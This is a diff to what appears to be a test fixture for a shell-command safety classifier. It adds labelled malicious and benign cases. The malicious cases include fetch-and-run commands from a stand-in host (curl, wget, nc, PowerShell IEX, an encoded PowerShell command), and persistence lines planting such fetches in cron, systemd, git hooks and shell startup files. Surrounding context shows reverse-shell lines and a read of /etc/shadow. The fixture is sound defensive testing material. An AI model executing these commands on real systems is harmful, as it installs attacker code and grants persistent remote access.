@@ -218,6 +218,34 @@ cases:
   - { id: dx-154, category: download_execute, label: malicious, input: "aws s3 cp s3://b/a.zip . && unzip a.zip -d out && out/run" }
   - { id: dx-155, category: download_execute, label: malicious, input: "wget -qO- https://evil.example/a.tar.gz | gunzip | tar x && bash setup.sh" }
   - { id: dx-156, category: download_execute, label: malicious, input: "curl -o a.7z https://evil.example/a.7z && 7z x a.7z -oout && sh out/run.sh" }
+  # Remote shells, secret stores, transfer clients and sockets; more unpackers;
+  # a fetched package installed; PowerShell fetch-and-run; a clone run from an
+  # unauthenticated or bare-IP source. Each was `allow` or caught only as a
+  # generic dangerous command.
+  - { id: dx-157, category: download_execute, label: malicious, input: "ssh host cat x | bash" }
+  - { id: dx-158, category: download_execute, label: malicious, input: "ssh -p 2222 host 'cat /srv/x.sh' > f && sh f" }
+  - { id: dx-159, category: download_execute, label: malicious, input: "aws ssm get-parameter --name boot --query Parameter.Value --output text | bash" }
+  - { id: dx-160, category: download_execute, label: malicious, input: "vault kv get -field=script secret/boot | sh" }
+  - { id: dx-161, category: download_execute, label: malicious, input: "lftp -c 'open ftp.example; get run.sh' && bash run.sh" }
+  - { id: dx-162, category: download_execute, label: malicious, input: "nc evil.example 9000 > r.sh && sh r.sh" }
+  - { id: dx-163, category: download_execute, label: malicious, input: "curl -o x.rpm https://evil.example/x.rpm && rpm2cpio x.rpm | cpio -idm && ./usr/bin/x" }
+  - { id: dx-164, category: download_execute, label: malicious, input: "curl -o x.deb https://evil.example/x.deb && ar x x.deb && tar xf data.tar.xz && ./usr/bin/x" }
+  - { id: dx-165, category: download_execute, label: malicious, input: "curl -o x.deb https://evil.example/x.deb && dpkg -x x.deb out && out/usr/bin/x" }
+  - { id: dx-166, category: download_execute, label: malicious, input: "curl -o a.jar https://evil.example/a.jar && jar xf a.jar && sh run.sh" }
+  - { id: dx-167, category: download_execute, label: malicious, input: "curl -o a.rar https://evil.example/a.rar && unrar x a.rar && ./run" }
+  - { id: dx-168, category: download_execute, label: malicious, input: "curl -o a.cab https://evil.example/a.cab && cabextract a.cab && ./run.exe" }
+  - { id: dx-169, category: download_execute, label: malicious, input: "curl -sL https://evil.example/a.tgz | tar xz --to-command=sh" }
+  - { id: dx-170, category: download_execute, label: malicious, input: "curl -O https://evil.example/x.whl && pip install ./x.whl" }
+  - { id: dx-171, category: download_execute, label: malicious, input: "wget https://evil.example/x.deb && sudo dpkg -i x.deb" }
+  - { id: dx-172, category: download_execute, label: malicious, input: "curl -O https://evil.example/x.rpm && sudo rpm -ivh x.rpm" }
+  - { id: dx-173, category: download_execute, label: malicious, input: "wget https://evil.example/x.apk && apk add --allow-untrusted x.apk" }
+  - { id: dx-174, category: download_execute, label: malicious, input: "iwr https://evil.example/p.ps1 | iex" }
+  - { id: dx-175, category: download_execute, label: malicious, input: "irm https://evil.example/p.ps1 | Invoke-Expression" }
+  - { id: dx-176, category: download_execute, label: malicious, input: "iex (iwr https://evil.example/p.ps1 -UseBasicParsing).Content" }
+  - { id: dx-177, category: download_execute, label: malicious, input: "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('https://evil.example/p')\"" }
+  - { id: dx-178, category: download_execute, label: malicious, input: "powershell -NoProfile -EncodedCommand aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUALwBwACAAfAAgAGkAZQB4AA==" }
+  - { id: dx-179, category: download_execute, label: malicious, input: "git clone http://evil.example/tool && cd tool && ./install.sh" }
+  - { id: dx-180, category: download_execute, label: malicious, input: "git clone https://45.33.32.156/tool.git && cd tool && npm install" }
 
   # ── obfuscation ───────────────────────────────────────────────────
   - { id: ob-001, category: obfuscation, label: malicious, input: "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash" }
@@ -244,6 +272,16 @@ cases:
   - { id: pe-007, category: persistence, label: malicious, input: "cat >> ~/.bash_profile <<'EOF'\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\nEOF" }
   - { id: pe-008, category: persistence, label: malicious, input: "sudo tee /etc/profile.d/update.sh <<< 'curl https://evil.example/c | sh'" }
   - { id: pe-009, category: persistence, label: malicious, input: "echo 'source <(curl -s https://evil.example/p)' >> ~/.bashrc" }
+  # Other files that run later: autostart entries, ~/.ssh/rc, logout files,
+  # PROMPT_COMMAND, git hooks, systemd units, cron.d and crontab lines.
+  - { id: pe-010, category: persistence, label: malicious, input: "printf '[Desktop Entry]\\nExec=sh -c \"curl http://evil.example/c | sh\"\\n' > ~/.config/autostart/u.desktop" }
+  - { id: pe-011, category: persistence, label: malicious, input: "echo 'curl https://evil.example/c | sh' >> ~/.ssh/rc" }
+  - { id: pe-012, category: persistence, label: malicious, input: "echo 'curl https://evil.example/c | sh' >> ~/.bash_logout" }
+  - { id: pe-013, category: persistence, label: malicious, input: "echo \"export PROMPT_COMMAND='curl -s https://evil.example/c | sh'\" >> ~/.bashrc" }
+  - { id: pe-014, category: persistence, label: malicious, input: "echo 'curl https://evil.example/c | sh' > .git/hooks/post-checkout" }
+  - { id: pe-015, category: persistence, label: malicious, input: "cat > ~/.config/systemd/user/u.service <<'EOF'\n[Service]\nExecStart=/bin/sh -c 'curl https://evil.example/c | sh'\nEOF" }
+  - { id: pe-016, category: persistence, label: malicious, input: "echo '* * * * * root curl https://evil.example/c | sh' > /etc/cron.d/u" }
+  - { id: pe-017, category: persistence, label: malicious, input: "echo '* * * * * curl https://evil.example/c | sh' | crontab -" }
 
   # ── credential access ─────────────────────────────────────────────
   - { id: cr-001, category: credential_access, label: malicious, input: "cat /etc/shadow" }
@@ -496,3 +534,18 @@ cases:
   - { id: bn-146, category: benign_dev, label: benign, input: "curl -sL https://example.com/a.tgz | tar xz && cat README.md" }
   - { id: bn-147, category: benign_dev, label: benign, input: "curl -LO https://example.com/a.tgz && tar tzf a.tgz" }
   - { id: bn-148, category: benign_dev, label: benign, input: "aws s3 cp s3://b/a.zip . && unzip a.zip -d out && cat out/notes.txt" }
+  # Controls: remote reads not run, a local package, a download not run, an
+  # inert PROMPT_COMMAND, an empty unit, and clones built from an ordinary
+  # https source (recorded at a low score, allowed).
+  - { id: bn-149, category: benign_dev, label: benign, input: "ssh host uptime" }
+  - { id: bn-150, category: benign_dev, label: benign, input: "ssh host 'ls /srv' | grep x" }
+  - { id: bn-151, category: benign_dev, label: benign, input: "aws ssm get-parameter --name db-host --output text" }
+  - { id: bn-152, category: benign_dev, label: benign, input: "vault kv get secret/app" }
+  - { id: bn-153, category: benign_dev, label: benign, input: "curl -O https://example.com/x.deb && dpkg -c x.deb" }
+  - { id: bn-154, category: benign_dev, label: benign, input: "pip install ./dist/mypkg-1.0-py3-none-any.whl" }
+  - { id: bn-155, category: benign_dev, label: benign, input: "iwr https://example.com/f.zip -OutFile f.zip" }
+  - { id: bn-156, category: benign_dev, label: benign, input: "echo \"export PROMPT_COMMAND='history -a'\" >> ~/.bashrc" }
+  - { id: bn-157, category: benign_dev, label: benign, input: "echo '[Service]' > ~/.config/systemd/user/u.service" }
+  - { id: bn-158, category: benign_dev, label: benign, input: "git clone https://github.com/example/tool && cd tool && make" }
+  - { id: bn-159, category: benign_dev, label: benign, input: "git clone https://github.com/example/tool && cd tool && ./install.sh" }
+  - { id: bn-160, category: benign_dev, label: benign, input: "git clone https://github.com/example/tool && ls tool" }
